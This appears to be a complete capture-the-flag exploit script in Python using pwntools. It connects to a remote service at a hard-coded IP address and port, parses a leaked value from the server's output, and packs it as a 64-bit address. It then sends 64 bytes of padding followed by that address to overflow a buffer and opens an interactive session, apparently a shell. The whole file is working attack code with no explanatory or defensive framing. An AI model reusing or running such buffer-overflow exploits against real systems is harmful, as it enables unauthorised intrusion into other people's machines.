from pwn import *

proc = remote("109.233.56.90", 11588)
proc.recvline()
proc.recvline()
s = proc.recvline()
s = s.decode().split("\'")[1]
s = p64(int(s))
proc.send(b"a"*4*16 + s)
proc.interactive()
